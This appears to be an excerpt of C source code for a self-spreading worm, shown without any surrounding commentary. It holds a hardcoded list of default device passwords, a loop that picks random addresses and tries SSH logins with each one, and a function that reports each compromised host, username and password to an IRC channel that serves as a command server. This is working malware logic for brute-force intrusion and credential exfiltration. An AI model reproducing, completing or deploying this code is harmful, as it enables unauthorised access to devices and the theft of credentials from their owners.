...
char pass[11][10] = {"fucker","root","123456",
  "000000","111111","Zte521","admin","anko",
  "openelec","uClinux","xmhdipc"};
char host[16],myworm[10],remoteworm[20];
void sendToIrc(int i){
  int socketirc,numchar;
  ...
  numchar=sprintf(data,"user 4d50 4d50 4d50 4d50\n"
    "nick Ad50_%d\n",rand());
  write(socketirc,data,numchar);ioctl(socketirc,FIONREAD,
    &numchar);
  while(numchar == 0){ioctl(socketirc,FIONREAD,&numchar);}
  while(numchar != 0){read(socketirc,data,numchar);
    data[numchar]='\0';sleep(1);ioctl(socketirc,FIONREAD,
      &numchar);}
  ioctl(socketirc,FIONREAD,&numchar);
  while(numchar == 0){
    ioctl(socketirc,FIONREAD,&numchar);}
  while(numchar != 0){read(socketirc,data,100);
    data[99]='\0';ioctl(socketirc,FIONREAD,&numchar);}
  numchar=sprintf(data,"join #4d50\nprivmsg #4d50 :"
    "%s %s %s\nquit\n",host,user[i],pass[i]);
  write(socketirc,data,numchar);
  sleep(5);
  close(socketirc);}
int main(int argc, char *argv[]){
  ...
  while(1==1){
    sprintf(host,"%s%d",MYNET,(rand()%255)+1);
    i=0;
    while(i < 11){
      session=ssh_new();
